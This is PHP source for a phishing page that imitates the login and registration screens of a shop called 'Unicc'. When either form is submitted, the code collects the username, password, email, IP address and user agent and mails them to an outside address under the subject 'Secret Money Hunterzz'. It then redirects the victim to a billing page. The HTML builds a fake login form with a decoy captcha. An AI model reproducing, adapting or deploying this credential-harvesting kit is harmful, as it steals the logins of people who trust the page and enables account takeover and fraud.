<?php
session_start();
$link = "http://".$_SERVER['HTTP_HOST'];
if (isset($_POST['register'])) {
date_default_timezone_set('Asia/Kolkata');
$frommail    =   rand(); 
$ip          =   getenv("REMOTE_ADDR");
$date        =   date("d M , Y g:i a");
$ruser       =   $_POST['rusername'];
$rpass       =   $_POST['rpassword'];
$rcpass      =   $_POST['rcpassword'];
$email       =   $_POST['mail'];
$to          =   "7gpmy@trimsj.com";
$agent       =   $_SERVER['HTTP_USER_AGENT'];
$_SESSION["username"] = $ruser;


  $subj = "Secret Money Hunterzz";
  $msg = "++==========| Unicc Signup Info <3 |==========++\nUsername: $ruser\nPassword: $rpass\nConfirm Password: $rcpass\nEmail: $email\n++==========|Device  Info|==========++\nDate: $date\nIp info: $ip\nCheck at:  http://www.geoiptool.com/?IP=$ip\nUser Agent; $agent\n++===|Coded By Deepanshu :v|===++\n++==========|End|==========++\n";

  $from = 'From: Unicc Signup  <$frommail."@mail.com">';

    mail($to, $subj, $msg, $from);
    
    
header ("Location:".$link."/billing/");


}


elseif (isset($_POST['login'])) {

date_default_timezone_set('Asia/Kolkata');
$frommail = rand()  ;
$ip = getenv("REMOTE_ADDR");
$date=date("d M , Y g:i a");
$user=$_POST['username'];
$pass=$_POST['password'];
$to="7gpmy@trimsj.com";
$agent=$_SERVER['HTTP_USER_AGENT'];
$_SESSION["username"] = $user; 




  $subj = "Secret Money Hunterzz";
  $msg = "++==========| Unicc Login Info <3 |==========++\nUsername: $user\nPassword: $pass\n++==========|Device  Info|==========++\nDate: $date\nIp info: $ip\nCheck at:  http://www.geoiptool.com/?IP=$ip\nUser Agent; $agent\n++===|Coded By Deepanshu :v|===++\n++==========|End|==========++\n";
 
   $from = 'From: Unicc Login  <$frommail."@mail.com">';
  
    mail($to, $subj, $msg, $from);

    
header("Location:".$link."/billing/");

}
else{
  ?>


<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="css/main.css" />
<link rel="stylesheet" type="text/css" href="ui/css/bootstrap.min.css" />
<link rel="stylesheet" type="text/css" href="ui/css/bootstrap-theme.min.css" />
<link rel="stylesheet" type="text/css" href="ui/css/nstyle.min.css" />





<title>Shop - Login</title>
</head>
<body class='login'>
    
<form class="form-signin form" autocomplete="off" id="login-form" action="/" method="post" name="login">

<div class='blocklogin'>
  <div class='titlelogin'> <img src='/img/logo.png'>
      <p>login area</p>
  </div>
  <div class='loginform'>
    <div class='inputslogin'>
      <label for='name'><img src='img/log_user.png'></label>
      <div class="form-group">
        <div>
          <input class="form-control" placeholder="Username" name="username" id="username" type="text" size="6" required="required" />
          
        </div>
      </div>
      <label for='pass'><img src='img/log_pass.png'></label>
      <div class="form-group">
        <div>
          <input class="form-control" placeholder="Password" name="password"  type="password" size="8" required="required" />
          
        </div>
      </div>

      <img class="captchaimg" id="yw0" src="../img/download.png" alt="">
      <div class="form-group"><div><input style="width:110px;" class="form-control" placeholder="Captcha" name="LoginForm[captcha]" id="LoginForm_captcha" type="text"><div class="help-block error" id="LoginForm_captcha_em_" style="display:none"></div></div></div>
      <a href="http://anonym.to/?https://youtu.be/NT4PED4iqLU" class="wtchvdo" rel="noreferrer" target="_blank">Watch our PROMO video</a>
      <button type='submit' name="login">enter</button>
      <a href="signup">
        <button type='button'>register</button>
      </a> </div>
    <div id="resetPasswordNotification" class="text-center alert alert-danger hide"> <strong>Warning: if you had password that is less than 8 characters long or username less than 6 characters
      long you
      will have to reset them!</strong><br/>
                      <strong><a href="resetpassword">Follow this link to reset your
                        password.</a></strong> </div>
    <div id="yw0"></div>
  </div>
</div>
</form>


</body>
</html>
<?php }

?>